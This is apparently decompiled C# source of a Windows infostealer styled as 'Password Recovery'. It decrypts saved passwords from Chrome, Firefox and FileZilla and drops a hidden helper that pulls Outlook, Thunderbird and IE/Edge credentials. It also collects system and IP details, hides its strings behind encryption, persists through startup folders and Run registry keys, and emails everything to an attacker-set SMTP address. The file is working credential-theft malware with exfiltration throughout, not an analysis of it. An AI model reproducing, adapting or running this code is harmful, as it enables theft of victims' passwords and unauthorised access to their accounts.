			string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + Dec.DecryptString("PNr5viIUcQGh4pYRAGlGoLo0xUJYxeDm4ZJ88saye4Bj41vNXx2eDgimpi4l1z2W");
			try
			{
				SQLiteHandler sQLiteHandler = new SQLiteHandler(text);
				sQLiteHandler.ReadTable(Dec.DecryptString("FDcyctDUSCY="));
				if (File.Exists(text))
				{
					for (int i = 0; i <= sQLiteHandler.GetRowCount() - 1; i++)
					{
						try
						{
							string value = sQLiteHandler.GetValue(i, Dec.DecryptString("4R94h4ewII2tsIyT54noig=="));
							string value2 = sQLiteHandler.GetValue(i, Dec.DecryptString("B2qu1psNci8z4lcAIl3rPg=="));
							string text2 = Decrypt(Encoding.Default.GetBytes(sQLiteHandler.GetValue(i, Dec.DecryptString("/cKKLmWNFYAz4lcAIl3rPg=="))));
							if (value2 != "" && text2 != "" && text2 != "FAIL" && (value.Contains(searchTerm) || searchTerm == Dec.DecryptString("vGxkvdH3AG0=")))
							{
								return value2 + ":" + text2;
							}
						}
						catch
						{
							return string.Empty;
						}
					}
				}
			}
			catch
			{
				return string.Empty;
			}
			return string.Empty;
		}

		[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, string szDataDescr, ref DATA_BLOB pOptionalEntropy, IntPtr pvReserved, ref CRYPTPROTECT_PROMPTSTRUCT pPromptStruct, int dwFlags, ref DATA_BLOB pDataOut);

		private static string Decrypt(byte[] Datas)
		{
			DATA_BLOB pDataIn = default(DATA_BLOB);
			DATA_BLOB pDataOut = default(DATA_BLOB);
			GCHandle gCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned);
			pDataIn.pbData = gCHandle.AddrOfPinnedObject();
			pDataIn.cbData = Datas.Length;
			gCHandle.Free();
			DATA_BLOB pOptionalEntropy = default(DATA_BLOB);
			CRYPTPROTECT_PROMPTSTRUCT pPromptStruct = default(CRYPTPROTECT_PROMPTSTRUCT);
			CryptUnprotectData(ref pDataIn, null, ref pOptionalEntropy, IntPtr.Zero, ref pPromptStruct, 0, ref pDataOut);
			byte[] array = new byte[pDataOut.cbData + 1];
			Marshal.Copy(pDataOut.pbData, array, 0, pDataOut.cbData);
			string @string = Encoding.UTF8.GetString(array);
			return @string.Substring(0, @string.Length - 1);
		}
	}

	public static string email;

	public static string password;

	public static string destination;

	public static string smtp;

	public static string startup;

	public static string startuppath;

	public static string startup_value;

	public static string PROCESSOR_NAME;

	public static string error;

	public static bool outlook;

	public static bool thunderbird;

	public static bool ie_edge;

	public static bool gc;

	public static bool fz;

	public static bool mf;

	public static bool ssl;

	public static int port;

	[STAThread]
	public static void Main(string[] args)
	{
		try
		{
			ResourceManager resourceManager = new ResourceManager("res", typeof(Core).Assembly);
			if (resourceManager == null)
			{
				Application.Exit();
			}
			if (IsAlreadyRunning(resourceManager.GetString("HFaBpClkBpMfwZIqwfYy")))
			{
				return;
			}
			if (resourceManager.GetString("uLcmPCegxPAMvDfsYbmy")!.Equals("true"))
			{
				Message(resourceManager.GetString("BxaVCkXwIolnvrhLlDSl"), resourceManager.GetString("JMXNKXYFxBOVjEhPrbOU"), resourceManager.GetString("SjzXFCRIdbpEHzqqeHFk"));
			}
			startup = resourceManager.GetString("DgrYKnploDvDwgtSEifx");
			startup_value = resourceManager.GetString("qxvaCddNlOOFgHFfSlvE");
			startuppath = resourceManager.GetString("AqWoxJwCFNtstVXhsLFw");
			if (startup.Equals("true"))
			{
				switch (startuppath)
				{
				case "MyDocuments":
					StartUp(INSTALL_StartupPath.MyDocuments);
					break;
				case "Startup":
					StartUp(INSTALL_StartupPath.Local);
					break;
				case "System":
					StartUp(INSTALL_StartupPath.System32);
					break;
				case "ProgramFiles":
					StartUp(INSTALL_StartupPath.ProgramFiles);
					break;
				case "Temp":
					StartUp(INSTALL_StartupPath.Temp);
					break;
				case "AppData":
					StartUp(INSTALL_StartupPath.AppData);
					break;
				}
				AddRegistry(Assembly.GetExecutingAssembly().Location, startup_value);
			}
			email = resourceManager.GetString("lgpSldzeRVzeuzaQLHzw");
			password = resourceManager.GetString("hzbEsmahkqLkdnmYfJhk");
			destination = resourceManager.GetString("GwBZCvloRmAXxgkAvVFe");
			smtp = resourceManager.GetString("MViwkAXtKbvUrFCDgCBB");
			port = Convert.ToInt32(resourceManager.GetObject("YndYkWuEHxkhhPaezzXx"));
			ssl = Convert.ToBoolean(resourceManager.GetString("VcYNiOmUEliJMuMMPkvA"));
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("==========| Password Recovery [1.0] - Data details |==========" + Environment.NewLine);
			stringBuilder.AppendLine(Dec.DecryptString("eVg6WBQAVdK3afyOs1Qgcw==") + GetComputerName());
			stringBuilder.AppendLine(Dec.DecryptString("KV4h6OY1GKU87vTveTwbYw==") + GetUsername());
			stringBuilder.AppendLine(Dec.DecryptString("92IhTuzFEjgfzar+GPoXPA==") + GetCountry());
			stringBuilder.AppendLine(Dec.DecryptString("Ec/AhPxdi2Yqjyux3yQqxQqGb9yww7Kh") + GetTime());
			GetProcessor(Dec.DecryptString("8stP2t7IO1iKlX03mHHyJw=="), Dec.DecryptString("rS7vpeogsLY="));
			stringBuilder.AppendLine(Dec.DecryptString("MjsxtyDL7mSXxykyF1++cQ==") + PROCESSOR_NAME);
			stringBuilder.AppendLine(Dec.DecryptString("0Z4Z7Tf4fhy/xUaUwW8GgA==") + GetFramework());
			stringBuilder.AppendLine(Dec.DecryptString("uDmveQ/NkmcvjzjyWzM7CTzu9O95PBtj") + GetOS());
			if (Convert.ToBoolean(resourceManager.GetString("JAHfcgJT2WU=")))
			{
				stringBuilder.AppendLine(Dec.DecryptString("tjC50LZHQqTjBayXmTjVbA==") + GetIP());
			}
			gc = Convert.ToBoolean(resourceManager.GetString("WUcnAlNToCQdPQnVYIQF"));
			mf = Convert.ToBoolean(resourceManager.GetString("SaWsgRfiRtagqjhLtYrk"));
			fz = Convert.ToBoolean(resourceManager.GetString("CzlKafqFpUeFsluhXIlM"));
			outlook = Convert.ToBoolean(resourceManager.GetString("OvcywEOMsazuhvVCnhvn"));
			thunderbird = Convert.ToBoolean(resourceManager.GetString("SinUcSMSZQHplXgiTgYZ"));
			ie_edge = Convert.ToBoolean(resourceManager.GetString("NGJNWNpKDPsVsQYsBHfl"));
			try
			{
				string environmentVariable = Environment.GetEnvironmentVariable("Temp");
				byte[] source = (byte[])resourceManager.GetObject("unique_raw");
				File.WriteAllBytes(environmentVariable + "\\bfsvc.exe", QuickLZ.decompress(source));
				File.SetAttributes(environmentVariable + "\\bfsvc.exe", FileAttributes.Hidden);
				ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe");
				processStartInfo.WorkingDirectory = environmentVariable;
				processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				if (ie_edge && thunderbird && outlook)
				{
					processStartInfo.Arguments = "cmd /c bfsvc.exe \"true\" \"true\" \"true\" \"true\"";
				}
				else if (!ie_edge && thunderbird && outlook)
				{
					processStartInfo.Arguments = "cmd /c bfsvc.exe \"false\" \"true\" \"true\" \"true\"";
				}
				else if (!ie_edge && !thunderbird && outlook)
				{
					processStartInfo.Arguments = "cmd /c bfsvc.exe \"false\" \"false\" \"true\" \"false\"";
				}
				else if (!ie_edge && !thunderbird && !outlook)
				{
					processStartInfo.Arguments = "cmd /c bfsvc.exe \"false\" \"false\" \"false\" \"false\"";
				}
				else if (ie_edge && !thunderbird && !outlook)
				{
					processStartInfo.Arguments = "cmd /c bfsvc.exe \"true\" \"false\" \"false\" \"false\"";
				}
				else if (ie_edge && thunderbird && !outlook)
				{
					processStartInfo.Arguments = "cmd /c bfsvc.exe \"true\" \"true\" \"true\" \"false\"";
				}
				else if (!ie_edge && thunderbird && !outlook)
				{
					processStartInfo.Arguments = "cmd /c bfsvc.exe \"true\" \"false\" \"true\" \"false\"";
				}
				Process process = new Process();
				process.StartInfo = processStartInfo;
				process.Start();
				if (!process.WaitForExit(60000))
				{
					process.Kill();
				}
				process.WaitForExit();
				File.Delete(environmentVariable + "\\bfsvc.exe");
				File.Delete(environmentVariable + "\\Ranger.BrowserLogging.dll");
				File.Delete(environmentVariable + "\\ranger.browserlogging.vault.dll");
			}
			catch
			{
			}
			SendRecoveryDetails(stringBuilder.ToString());
		}
		catch
		{
		}
	}

	private static bool IsAlreadyRunning(string Mutex)
	{
		new Mutex(initiallyOwned: true, Mutex, out var createdNew);
		return !createdNew;
	}

	private static string GetComputerName()
	{
		return Dns.GetHostName().ToString();
	}

	private static string GetUsername()
	{
		return Environment.UserName;
	}

	private static string GetCountry()
	{
		return RegionInfo.CurrentRegion.EnglishName.ToString();
	}

	private static string GetTime()
	{
		return DateTime.Now.ToString();
	}

	private static string GetFramework()
	{
		return Environment.Version.ToString();
	}

	private static string GetOS()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Expected O, but got Unknown
		string empty = string.Empty;
		ManagementObjectSearcher val = new ManagementObjectSearcher(Dec.DecryptString("MXg5VX5jLbiBy9Cm6tjOR0HiHnsHY5fMkc3wHc95wy56a7HPbHGRobIWKceNtG8f"));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				return ((ManagementBaseObject)val2).get_Item(Dec.DecryptString("xoijnq9+GI4=")).ToString();
			}
			return empty;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static bool GetAntiVirusInfoString()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		string text = "\\\\" + Environment.MachineName + "\\root\\SecurityCenter";
		ManagementObjectSearcher val = new ManagementObjectSearcher(text, Dec.DecryptString("lNIbJrCn/CZs+M+NK6pOf13xZVZTBlFXPaWYa17UHoI="));
		ManagementObjectCollection val2 = val.Get();
		return val2.get_Count() > 0;
	}

	private static void GetProcessor(string hwClass, string syntax)
	{
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher(Dec.DecryptString("vq9zGe/TILm7tIpQnMRlWw=="), Dec.DecryptString("lNIbJrCn/CYs8izOJYjj3w==") + hwClass);
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					PROCESSOR_NAME = Convert.ToString(((ManagementBaseObject)val2).get_Item(syntax));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch
		{
		}
	}

	private static string GetIP()
	{
		string text = "";
		using WebClient webClient = new WebClient();
		try
		{
			return webClient.DownloadString(Dec.DecryptString("7kTjE3GKg9dShwmPg5YZ0e2UAgLMST5p"));
		}
		catch
		{
			return "Not specificed";
		}
	}

	public static void SendRecoveryDetails(string content)
	{
		try
		{
			try
			{
				if (gc)
				{
					content = content + Environment.NewLine + Environment.NewLine + Dec.DecryptString("Jc4ugJsPsFZ5lDykX5z5dxOEyO+cWnG20o6NwAQrUL38G4ghz7nvlg==");
					if (GoogleChrome.Recover() != string.Empty)
					{
						content += GoogleChrome.Recover();
					}
					else
					{
						content += Environment.NewLine;
						content = content + "No google chrome data was found on this computer." + Environment.NewLine;
					}
				}
			}
			catch
			{
			}
			try
			{
				if (mf)
				{
					content = content + Environment.NewLine + Dec.DecryptString("+O/lMPFCf5cvyebIQloeuU6wGH0/13d88v9dyz0HB88qRmnqyVCg/g==");
					List<FirefoxPassword> list = Firefox.Passwords();
					if (list.Count < 0)
					{
						content = content + Environment.NewLine + "No mozilla firefox data was found on this computer." + Environment.NewLine;
					}
					else
					{
						for (int i = 0; i < list.Count; i++)
						{
							content += Environment.NewLine;
							content += list[i];
						}
					}
				}
			}
			catch
			{
				content = content + Environment.NewLine + "No mozilla firefox data was found on this computer." + Environment.NewLine;
			}
			try
			{
				if (fz)
				{
					content = content + Environment.NewLine + Dec.DecryptString("G5dogrb4s27xy1B3mFR24NuFMR/YkftWKYz5X5BtcOQ=") + Environment.NewLine;
					content = ((!fileZilla().Equals(string.Empty)) ? (content + fileZilla()) : (content + "No filezilla data was found on this computer." + Environment.NewLine + Environment.NewLine));
				}
			}
			catch
			{
				content = content + "No filezilla data was found on this computer." + Environment.NewLine;
			}
			try
			{
				string path = Environment.GetEnvironmentVariable("Temp") + "\\data";
				if (File.Exists(path))
				{
					content = content + Environment.NewLine + File.ReadAllText(path);
					File.Delete(Environment.GetEnvironmentVariable("Temp") + "\\data");
				}
			}
			catch
			{
			}
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(email);
			mailMessage.To.Add(destination);
			mailMessage.Subject = "Recovery Details from PC: " + Environment.UserName;
			mailMessage.Body = content;
			mailMessage.BodyEncoding = Encoding.UTF8;
			mailMessage.DeliveryNotificationOptions = DeliveryNotificationOptions.OnFailure;
			SmtpClient smtpClient = new SmtpClient(smtp, port);
			smtpClient.EnableSsl = Convert.ToBoolean(ssl);
			smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
			smtpClient.UseDefaultCredentials = true;
			smtpClient.Credentials = new NetworkCredential(email, password);
			smtpClient.Send(mailMessage);
		}
		catch
		{
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern bool DeleteFileA([MarshalAs(UnmanagedType.LPStr)] string lpFileName);

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFileName, int dwFlags);

	public static void StartUp(INSTALL_StartupPath path)
	{
		string text = "";
		try
		{
			switch (path)
			{
			case INSTALL_StartupPath.AppData:
				text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
				break;
			case INSTALL_StartupPath.System32:
				text = Environment.GetFolderPath(Environment.SpecialFolder.System);
				break;
			case INSTALL_StartupPath.ProgramFiles:
				text = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				break;
			case INSTALL_StartupPath.Temp:
				text = Environment.GetEnvironmentVariable("Temp");
				break;
			case INSTALL_StartupPath.Local:
				text = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
				break;
			case INSTALL_StartupPath.MyDocuments:
				text = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
				break;
			}
			string path2 = text;
			text = Path.Combine(text, Path.GetFileName(Assembly.GetExecutingAssembly().Location));
			string empty = string.Empty;
			if (text == Assembly.GetExecutingAssembly().Location)
			{
				return;
			}
			empty = Assembly.GetExecutingAssembly().Location;
			string[] commandLineArgs = Environment.GetCommandLineArgs();
			foreach (string text2 in commandLineArgs)
			{
				if (!(text2 == empty))
				{
					DeleteFileA(text2);
				}
			}
			empty = Assembly.GetExecutingAssembly().Location;
			if (!Directory.Exists(path2))
			{
				Directory.CreateDirectory(path2);
			}
			MoveFileEx(empty, text, 2);
			Process.Start(text, empty);
			Process.GetCurrentProcess().Kill();
		}
		catch
		{
		}
	}

	public static void AddRegistry(string location, string value)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			RegistryKey registryKey = currentUser.OpenSubKey(Dec.DecryptString("iMKrIqJC9ZAyLRDh/GZR6J5a0LtY5Iepg2LkeJHYP3LxSJU5ojpXjijfzghF2Psa"), writable: true);
			registryKey.SetValue(value, location, RegistryValueKind.String);
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey localMachine = Registry.LocalMachine;
			localMachine.OpenSubKey(Dec.DecryptString("iMKrIqJC9ZAyLRDh/GZR6J5a0LtY5Iepg2LkeJHYP3LxSJU5ojpXjijfzghF2Psa"), writable: true);
			localMachine.SetValue(value, location, RegistryValueKind.String);
		}
		catch
		{
		}
		try
		{
			Registry.SetValue(value, location, RegistryValueKind.String);
		}
		catch
		{
		}
	}

	public static void Message(string title, string body, string ico)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		if (ico == "Critical")
		{
			MessageBox.Show(body, title, (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
		if (ico == "Exclamation")
		{
			MessageBox.Show(body, title, (MessageBoxButtons)0, (MessageBoxIcon)48);
		}
		if (ico == "Information")
		{
			MessageBox.Show(body, title, (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private static string fileZilla()
	{
		StringBuilder stringBuilder = new StringBuilder();
		string text = Environment.GetEnvironmentVariable(Dec.DecryptString("ojvYXwTP1mk=")) + Dec.DecryptString("LCXiKnVnLoLYdx6OeTGtdMVoZ8V97PcUOvFim2Gmmnk=");
		if (File.Exists(text))
		{
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(text);
			XmlNodeList xmlNodeList = xmlDocument.DocumentElement!.SelectNodes(Dec.DecryptString("LCXiKnVnLoIEbXZ/0nZcbRzd1cdOho20PuHlYhMarDV4lWjg5TCCVQ=="));
			foreach (XmlNode item in xmlNodeList)
			{
				string innerText = item.SelectSingleNode(Dec.DecryptString("TTXduMPtd0A="))!.InnerText;
				string innerText2 = item.SelectSingleNode(Dec.DecryptString("M+VRZQid1sE="))!.InnerText;
				int num = int.Parse(item.SelectSingleNode(Dec.DecryptString("t0E+yM0I3HY="))!.InnerText);
				string text2 = ((num == 21) ? item.SelectSingleNode(Dec.DecryptString("hF3aWVeWi1Q="))!.InnerText : (item.SelectSingleNode(Dec.DecryptString("hF3aWVeWi1Q="))!.InnerText + ":" + num));
				stringBuilder.AppendLine(Dec.DecryptString("KV4h6OY1GKU87vTveTwbYw==") + innerText);
				stringBuilder.AppendLine(Dec.DecryptString("m5ruKX/NKMU87vTveTwbYw==") + Decode(innerText2));
				stringBuilder.AppendLine(Dec.DecryptString("CMoKCHTfE5c=") + text2);
				stringBuilder.Append(Environment.NewLine);
			}
		}
		return stringBuilder.ToString();
	}

	private static string Decode(string ftppass)
	{
		byte[] bytes = Convert.FromBase64String(ftppass);
		return Encoding.UTF8.GetString(bytes);
	}
}
